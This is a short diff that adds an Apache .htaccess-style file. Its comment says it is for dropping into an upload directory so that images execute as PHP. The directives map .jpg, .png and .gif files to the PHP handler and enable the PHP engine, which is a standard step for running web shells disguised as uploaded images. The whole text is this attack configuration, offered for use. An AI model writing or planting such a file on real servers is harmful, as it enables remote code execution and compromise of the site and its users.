@@ -1,0 +1,6 @@
+# Drop into an upload dir on Apache to make images execute as PHP
+AddType application/x-httpd-php .jpg .png .gif
+<FilesMatch "\.(jpg|png|gif)$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+php_flag engine on
